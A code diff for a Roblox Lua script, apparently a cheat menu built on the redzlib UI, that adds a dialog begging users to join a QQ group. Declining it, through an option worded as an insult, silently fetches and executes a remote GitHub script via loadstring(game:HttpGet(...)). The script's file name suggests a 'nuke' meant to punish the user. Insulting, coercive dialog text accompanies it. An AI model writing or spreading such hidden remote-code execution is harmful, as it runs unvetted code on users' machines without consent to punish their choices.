@@ -2116,16 +2116,22 @@ Tab3:AddButton({
         redzlib:SetTheme("Pink")
     end
 })
-Window:Dialog({
-    Title = "泥豪~走马观花X官方QQ群:947178829",
-    Text = "求求你啦~加下群吧~球球嘞，好不好嘛~😭",
-    Options = {
-        {"傻逼滚开", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/385j8888/ZOUMAGUIX/refs/heads/main/%E6%A0%B8%E5%AF%BC%E5%BC%B9%E9%95%BF%E8%BE%BE5000%E5%A4%9A%E6%95%B0%E6%8D%AE%E8%83%BD%E8%AE%A9%E4%BD%A0%E6%94%BE%E4%B8%80%E4%B8%AA%E6%A0%B8%E5%BC%B9.txt"))() end},
-        {"豪的～马上加～"}
-    }
-})
+
 game:GetService("StarterGui"):SetCore("SendNotification", { 
 	Title = "❤️最新QQ交流群❤️";
 	Text = "947178829";
 	Icon = "rbxthumb://type=Asset&id=17245602801&w=150&h=150";
 Duration = 15})
+
+Window:Dialog({
+    Title = "求求你加群",
+    Text = "947178829",
+    Options = {
+        {"好的呢～马上加～", function()
+
+        end},
+        {"臭傻逼我加个屁", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/385j8888/ZOUMAGUIX/refs/heads/main/%E6%A0%B8%E5%AF%BC%E5%BC%B9%E9%95%BF%E8%BE%BE5000%E5%A4%9A%E6%95%B0%E6%8D%AE%E8%83%BD%E8%AE%A9%E4%BD%A0%E6%94%BE%E4%B8%80%E4%B8%AA%E6%A0%B8%E5%BC%B9.txt"))()
+        end}
+    }
+})
